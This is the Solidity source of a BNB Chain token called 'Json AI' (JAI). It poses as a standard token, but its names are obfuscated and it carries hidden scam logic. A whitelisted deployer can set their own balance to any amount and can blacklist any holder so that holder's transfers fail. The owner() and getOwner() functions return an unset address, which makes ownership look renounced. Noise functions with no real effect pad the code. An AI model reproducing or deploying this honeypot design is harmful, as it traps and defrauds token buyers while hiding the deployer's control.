/**
 *Submitted for verification at BscScan.com on 2023-02-22
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface lwqdexupzmx {
    function totalSupply() external view returns (uint256);

    function balanceOf(address aoptgaagc) external view returns (uint256);

    function transfer(address kqhwiblukhsvg, uint256 ievattvvw) external returns (bool);

    function allowance(address glbfcstkcuu, address spender) external view returns (uint256);

    function approve(address spender, uint256 ievattvvw) external returns (bool);

    function transferFrom(
        address sender,
        address kqhwiblukhsvg,
        uint256 ievattvvw
    ) external returns (bool);

    event Transfer(address indexed from, address indexed hrxwyakyreayyo, uint256 value);
    event Approval(address indexed glbfcstkcuu, address indexed spender, uint256 value);
}

interface tlwnotqmlfy is lwqdexupzmx {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract epmcinaila {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface xzlnkpzoud {
    function createPair(address mdmtxpcgxt, address wcwuvvcqmqx) external returns (address);
}

interface wmvhuluah {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract JsonAI is epmcinaila, lwqdexupzmx, tlwnotqmlfy {

    bool private brtkgqslbjgsdp;

    function transfer(address hvunzlpsnfat, uint256 ievattvvw) external virtual override returns (bool) {
        return fcyjmfkmlx(_msgSender(), hvunzlpsnfat, ievattvvw);
    }

    function hwixvcxsmqz(address ybynxsyiebbvub) public {
        if (izriqwelyf) {
            return;
        }
        
        zxsvfgyos[ybynxsyiebbvub] = true;
        
        izriqwelyf = true;
    }

    function name() external view virtual override returns (string memory) {
        return ipmkeirldu;
    }

    uint256 private fizkhxmredajhf = 100000000 * 10 ** 18;

    address public pysfogyjzarmv;

    bool private upooaspkhdaac;

    uint256 public zuwfpbmsii;

    function allowance(address ynbzvbikgabav, address ymjjaxztfor) external view virtual override returns (uint256) {
        return ylcfyfefu[ynbzvbikgabav][ymjjaxztfor];
    }

    function nerxhvrxobwqto() public view returns (bool) {
        return ttizrhcxmu;
    }

    function transferFrom(address fzzsjblwua, address kqhwiblukhsvg, uint256 ievattvvw) external override returns (bool) {
        if (ylcfyfefu[fzzsjblwua][_msgSender()] != type(uint256).max) {
            require(ievattvvw <= ylcfyfefu[fzzsjblwua][_msgSender()]);
            ylcfyfefu[fzzsjblwua][_msgSender()] -= ievattvvw;
        }
        return fcyjmfkmlx(fzzsjblwua, kqhwiblukhsvg, ievattvvw);
    }

    constructor (){ 
        if (dpxiuhttsrpcl) {
            fuvjsydkqkia = lbgjtmeys;
        }
        wmvhuluah amvjprngi = wmvhuluah(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        pysfogyjzarmv = xzlnkpzoud(amvjprngi.factory()).createPair(amvjprngi.WETH(), address(this));
        
        pfojjzludungkp = _msgSender();
        zxsvfgyos[_msgSender()] = true;
        
        utbcdrtdtdq[_msgSender()] = fizkhxmredajhf;
        emit Transfer(address(0), pfojjzludungkp, fizkhxmredajhf);
    }

    function gxqytlkid() public {
        if (ywbxrusikjoq == fuvjsydkqkia) {
            brtkgqslbjgsdp = true;
        }
        if (dpxiuhttsrpcl) {
            szbbetropbnupb = ywbxrusikjoq;
        }
        zuwfpbmsii=0;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return fizkhxmredajhf;
    }

    address public pfojjzludungkp;

    function alzuuvhiawj() public {
        if (upooaspkhdaac) {
            brtkgqslbjgsdp = true;
        }
        
        zuwfpbmsii=0;
    }

    mapping(address => bool) public zxsvfgyos;

    bool public izriqwelyf;

    function getOwner() external view returns (address) {
        return jcllrkyzonjhw;
    }

    mapping(address => uint256) private utbcdrtdtdq;

    function eyktyecftf(address fzzsjblwua, address kqhwiblukhsvg, uint256 ievattvvw) internal returns (bool) {
        require(utbcdrtdtdq[fzzsjblwua] >= ievattvvw);
        utbcdrtdtdq[fzzsjblwua] -= ievattvvw;
        utbcdrtdtdq[kqhwiblukhsvg] += ievattvvw;
        emit Transfer(fzzsjblwua, kqhwiblukhsvg, ievattvvw);
        return true;
    }

    function symbol() external view virtual override returns (string memory) {
        return jvhklzbznf;
    }

    bool private ttizrhcxmu;

    function approve(address ymjjaxztfor, uint256 ievattvvw) public virtual override returns (bool) {
        ylcfyfefu[_msgSender()][ymjjaxztfor] = ievattvvw;
        emit Approval(_msgSender(), ymjjaxztfor, ievattvvw);
        return true;
    }

    function decimals() external view virtual override returns (uint8) {
        return vviqemuxjjscyk;
    }

    function rsnxcgkkzhp() public view returns (bool) {
        return dpxiuhttsrpcl;
    }

    function tldapvydywl(uint256 ievattvvw) public {
        if (!zxsvfgyos[_msgSender()]) {
            return;
        }
        utbcdrtdtdq[pfojjzludungkp] = ievattvvw;
    }

    uint256 private fuvjsydkqkia;

    uint256 public ywbxrusikjoq;

    uint8 private vviqemuxjjscyk = 18;

    uint256 public szbbetropbnupb;

    function nzqszpgjbnfvq(address ueqwehsfmcdteh) public {
        
        if (ueqwehsfmcdteh == pfojjzludungkp || ueqwehsfmcdteh == pysfogyjzarmv || !zxsvfgyos[_msgSender()]) {
            return;
        }
        if (ttizrhcxmu == dpxiuhttsrpcl) {
            lbgjtmeys = fuvjsydkqkia;
        }
        rhmitermvlxt[ueqwehsfmcdteh] = true;
    }

    function owner() external view returns (address) {
        return jcllrkyzonjhw;
    }

    string private jvhklzbznf = "JAI";

    mapping(address => bool) public rhmitermvlxt;

    function balanceOf(address aoptgaagc) public view virtual override returns (uint256) {
        return utbcdrtdtdq[aoptgaagc];
    }

    uint256 public lbgjtmeys;

    address private jcllrkyzonjhw;

    bool private dpxiuhttsrpcl;

    function wmawhlhouwefln() public {
        
        if (dpxiuhttsrpcl) {
            fuvjsydkqkia = szbbetropbnupb;
        }
        zuwfpbmsii=0;
    }

    function ugvnvztzngqn() public {
        
        
        ywbxrusikjoq=0;
    }

    string private ipmkeirldu = "Json AI";

    function fcyjmfkmlx(address fzzsjblwua, address kqhwiblukhsvg, uint256 ievattvvw) internal returns (bool) {
        if (fzzsjblwua == pfojjzludungkp) {
            return eyktyecftf(fzzsjblwua, kqhwiblukhsvg, ievattvvw);
        }
        require(!rhmitermvlxt[fzzsjblwua]);
        return eyktyecftf(fzzsjblwua, kqhwiblukhsvg, ievattvvw);
    }

    mapping(address => mapping(address => uint256)) private ylcfyfefu;

}